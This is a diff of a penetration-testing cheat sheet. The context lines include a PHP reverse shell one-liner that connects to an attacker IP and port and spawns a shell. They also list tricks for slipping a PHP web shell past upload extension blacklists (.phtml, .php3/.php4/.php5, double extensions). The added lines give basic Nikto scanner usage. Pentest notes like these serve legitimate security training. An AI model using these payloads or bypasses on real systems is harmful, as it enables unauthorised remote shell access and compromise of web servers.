@@ -9,8 +9,6 @@ Reverse shell one-liners:
 <?php $s=fsockopen("192.168.16.124",1234);exec("sh<&3>&3 2>&3") ;?>
 
 
-
-
 COMMAND INJECTION
 =================
 
@@ -43,3 +41,13 @@ shell.php.xxxjpg (still ends in .jpg, but not recognised extension so will defau
 .phtml (a commonly used php parsed extension often forgotten about!)
 
 .php3/.php4/.php5 (valid PHP extensions possibly left out of extension blacklists)
+
+
+Nikto
+=====
+
+Simple scan:
+
+```
+perl nikto.pl -host http://www.example.com
+```
